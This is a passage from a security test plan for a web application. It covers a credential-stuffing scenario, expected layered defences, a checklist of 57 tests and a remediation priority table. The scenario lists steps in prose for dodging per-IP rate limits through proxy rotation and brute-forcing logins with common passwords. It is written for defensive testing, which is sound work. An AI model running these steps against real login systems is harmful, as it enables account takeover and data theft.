  1. Rotate IPs via proxy to bypass per-IP rate limit
  2. Send 10,000 login attempts with common passwords
  3. Once credentials found, access user data
- **Expected Defense in Depth:**
  1. Global rate limit (1000 QPS) still applies regardless of IP rotation (step 1 partially fails)
  2. Account lockout after 5 failed attempts (step 2 fails after 5 tries per account)
  3. CAPTCHA required after 3 failed attempts (step 2 human verification required)
  4. Password complexity requirements make common passwords invalid
- **Pass Criteria:** Account lockout triggers. Login blocked after 5 failures per account.

---

## Test Execution Checklist

| Category | Test Count | Automated | Manual |
|----------|-----------|-----------|--------|
| SQL Injection | 7 | Yes | No |
| XSS | 6 | Yes | Partial |
| IDOR | 6 | Yes | No |
| Payment Tampering | 7 | Yes | No |
| Child Data Exposure | 7 | Yes | Yes |
| Rate Limit Bypass | 6 | Partial | Yes |
| JWT Manipulation | 8 | Yes | No |
| CORS Violation | 6 | Yes | Yes |
| Combined Attacks | 4 | No | Yes |
| **Total** | **57** | **41** | **16** |

---

## Remediation Priority

| Priority | Tests | Action Required |
|----------|-------|-----------------|
| P0 Critical | SQL-001, SQL-002, SQL-004, SQL-006, SQL-007, XSS-005, IDOR-003, IDOR-006, PAY-001, PAY-003, PAY-005, CHILD-001 through CHILD-007, JWT-002, JWT-003, JWT-004, JWT-006, JWT-008, COMBO-001 through COMBO-003 | Must pass before production deployment |
| P1 High | All remaining | Must pass before production deployment |
| P2 Medium | Remaining | Pass within 30 days of launch |
| P3 Low | Any future additions | Backlog |

---

*Security Test Scenarios Version: 1.0*
*Review Cycle: Quarterly or after any security incident*
*Owner: Security Engineering Team*
